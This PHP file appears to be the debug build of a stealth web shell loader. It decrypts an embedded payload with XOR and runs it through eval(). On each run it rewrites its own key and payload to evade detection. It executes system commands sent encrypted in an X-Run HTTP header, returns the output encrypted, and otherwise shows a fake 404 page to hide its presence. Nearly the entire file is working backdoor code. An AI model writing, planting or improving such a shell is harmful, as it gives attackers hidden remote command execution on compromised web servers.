<?php
// Fixed PHP loader with a simpler encryption approach - DEBUG VERSION
$key = "my_secret_key"; // Will be replaced with your secret key

// Debug log function
function debug_log($message) {
    $log_file = 'shell_debug.log';
    $timestamp = date('Y-m-d H:i:s');
    file_put_contents($log_file, "[$timestamp] $message\n", FILE_APPEND);
}

debug_log("Shell loaded with key: $key");

// Encrypted payload (will be replaced with actual encrypted shell)
$payload = "ENCRYPTED_PAYLOAD_PLACEHOLDER";

debug_log("Starting payload decryption");

// Decrypt the payload
$encrypted = base64_decode($payload);
$key_bytes = hash('sha256', $key, true);
$decrypted = '';

// XOR decryption
for ($i = 0; $i < strlen($encrypted); $i++) {
    $decrypted .= chr(ord($encrypted[$i]) ^ ord($key_bytes[$i % strlen($key_bytes)]));
}

debug_log("Payload decrypted, length: " . strlen($decrypted));

// Decompress the shell code
$shell_code = @gzuncompress(base64_decode($decrypted));

if ($shell_code) {
    debug_log("Shell code decompressed successfully, length: " . strlen($shell_code));
    
    // Self-modifying: change the key each time
    $new_key = bin2hex(random_bytes(8));
    debug_log("Generated new key: $new_key");
    
    // Re-encrypt with the new key
    $compressed = gzcompress($shell_code);
    $encoded = base64_encode($compressed);
    $new_key_bytes = hash('sha256', $new_key, true);
    $encrypted = '';
    
    for ($i = 0; $i < strlen($encoded); $i++) {
        $encrypted .= chr(ord($encoded[$i]) ^ ord($new_key_bytes[$i % strlen($new_key_bytes)]));
    }
    
    $new_payload = base64_encode($encrypted);
    debug_log("Re-encrypted payload with new key, length: " . strlen($new_payload));
    
    // Update the file with new key and payload - using different regex delimiters
    $current_content = file_get_contents(__FILE__);
    $new_content = preg_replace(
        ['~\$key = ".*?";~', '~\$payload = ".*?";~'],
        ["\$key = \"$new_key\";", "\$payload = \"$new_payload\";"],
        $current_content
    );
    
    // Write the modified content back to the file
    if ($new_content !== $current_content) {
        $result = @file_put_contents(__FILE__, $new_content);
        debug_log("File self-modified: " . ($result ? "Success" : "Failed"));
    } else {
        debug_log("No changes needed to file content");
    }
    
    // Execute the shell code
    debug_log("Executing shell code via eval()");
    eval($shell_code);
    debug_log("Shell code execution completed");
}

debug_log("Checking for X-Run header: " . (isset($_SERVER['HTTP_X_RUN']) ? "Present" : "Not present"));

// Process command from X-Run header
if (isset($_SERVER['HTTP_X_RUN'])) {
    $cmd_encrypted = $_SERVER['HTTP_X_RUN'];
    debug_log("Received encrypted command: $cmd_encrypted");
    
    // Decrypt the command
    $cmd_encrypted_raw = base64_decode($cmd_encrypted);
    debug_log("Base64 decoded command length: " . strlen($cmd_encrypted_raw));
    
    $cmd_key_bytes = hash('sha256', $key, true);
    debug_log("Using key for command decryption: $key");
    
    $cmd_decrypted = '';
    
    // XOR decryption
    for ($i = 0; $i < strlen($cmd_encrypted_raw); $i++) {
        $cmd_decrypted .= chr(ord($cmd_encrypted_raw[$i]) ^ ord($cmd_key_bytes[$i % strlen($cmd_key_bytes)]));
    }
    
    debug_log("XOR decrypted command: $cmd_decrypted");
    
    // Decompress the command
    try {
        $base64_decoded = base64_decode($cmd_decrypted);
        debug_log("Base64 decoded inner command length: " . strlen($base64_decoded));
        
        $command = @gzuncompress($base64_decoded);
        
        if ($command === false) {
            debug_log("gzuncompress failed: " . error_get_last()['message']);
        } else {
            debug_log("Command decompressed successfully: $command");
        }
    } catch (Exception $e) {
        debug_log("Exception during command decompression: " . $e->getMessage());
        $command = false;
    }
    
    if ($command) {
        debug_log("Executing command: $command");
        
        // Execute the command and capture output
        ob_start();
        $return_code = 0;
        system($command . " 2>&1", $return_code);
        $output = ob_get_clean();
        
        debug_log("Command executed with return code: $return_code");
        debug_log("Command output: $output");
        
        // Encrypt the output
        try {
            $output_compressed = gzcompress($output);
            debug_log("Output compressed, length: " . strlen($output_compressed));
            
            $output_encoded = base64_encode($output_compressed);
            debug_log("Output base64 encoded, length: " . strlen($output_encoded));
            
            $output_encrypted = '';
            
            for ($i = 0; $i < strlen($output_encoded); $i++) {
                $output_encrypted .= chr(ord($output_encoded[$i]) ^ ord($cmd_key_bytes[$i % strlen($cmd_key_bytes)]));
            }
            
            debug_log("Output XOR encrypted, length: " . strlen($output_encrypted));
            
            // Return the encrypted output
            $final_output = base64_encode($output_encrypted);
            debug_log("Final base64 encoded output, length: " . strlen($final_output));
            
            echo $final_output;
            debug_log("Response sent successfully");
            exit;
        } catch (Exception $e) {
            debug_log("Exception during output encryption: " . $e->getMessage());
        }
    } else {
        debug_log("Command decryption/decompression failed");
    }
}

// Check for other command methods
debug_log("Checking for POST command: " . (isset($_POST['cmd']) ? "Present" : "Not present"));
debug_log("Checking for GET command: " . (isset($_GET['cmd']) ? "Present" : "Not present"));

// If no command was processed, display a harmless 404 page
if (!isset($_SERVER['HTTP_X_RUN']) && !isset($_POST['cmd']) && !isset($_GET['cmd'])) {
    debug_log("No command found, displaying 404 page");
    header('HTTP/1.0 404 Not Found');
    echo '<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>';
} else {
    debug_log("Command processing completed");
}
?>
